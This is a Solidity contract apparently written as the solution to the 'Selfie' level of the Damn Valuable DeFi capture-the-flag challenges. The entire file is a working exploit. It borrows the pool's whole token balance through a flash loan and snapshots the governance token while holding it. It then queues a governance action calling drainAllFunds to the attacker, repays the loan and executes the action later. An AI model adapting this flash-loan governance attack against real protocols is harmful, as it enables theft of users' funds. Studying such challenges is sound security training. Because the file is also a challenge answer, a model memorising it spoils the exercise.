// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../DamnValuableToken.sol";
import "../../DamnValuableTokenSnapshot.sol";
import "../../selfie/SelfiePool.sol";
import "../../selfie/SimpleGovernance.sol";

contract SelfieAttacker {
    DamnValuableTokenSnapshot private dvt;
    SelfiePool private immutable pool;
    SimpleGovernance private governance;

    uint256 private actionId;

    address private immutable owner;

    constructor(address _dvt, address _pool, address _governance) {
        dvt = DamnValuableTokenSnapshot(_dvt);
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);

        owner = msg.sender;
    }

    function stage1() external {
        require(msg.sender == owner, "niet");
        uint256 maxFlashLoan = dvt.balanceOf(address(pool));
        pool.flashLoan(maxFlashLoan);
    }

    function receiveTokens(address _token, uint256 _amount) external {
        require(msg.sender == address(pool), ":|");
        require(_amount == dvt.balanceOf(address(this)), "?!");
        require(_token == address(dvt), "????");

        dvt.snapshot();
        actionId = governance.queueAction(
            msg.sender,
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                owner
            ),
            0
        );
        dvt.transfer(msg.sender, _amount);
    }

    function stage2() external {
        require(msg.sender == owner, "niet");
        governance.executeAction(actionId);
    }
}